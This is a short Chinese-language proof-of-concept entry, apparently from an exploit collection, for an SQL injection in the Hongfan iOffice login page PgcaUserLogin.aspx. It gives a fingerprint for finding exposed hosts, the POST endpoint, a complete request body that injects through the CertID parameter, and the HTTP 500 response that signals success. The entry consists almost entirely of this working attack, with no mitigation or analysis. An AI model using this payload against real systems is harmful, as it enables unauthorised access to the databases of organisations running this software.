# 红帆iofficePgcaUserLogin.aspx存在SQL注入漏洞

红帆 ｜ SQL注入 ｜ —
- **指纹**：`title="iOffice.net"`
- **请求**：`POST /ioffice/Identity/PgcaUserLogin.aspx HTTP/1.1`

**Payload**
```
__EVENTTARGET=btVerify&__EVENTARGUMENT=&__VIEWSTATE=YOUR___VIEWSTATE&__VIEWSTATEGENERATOR=YOUR___VIEWSTATEGENERATOR&btVerify=&CertID='-1/user--+-&lblSerialNum=SQLI_POC&txthidIsLogin=1&UserPIN=123456
```
- **响应特征**：500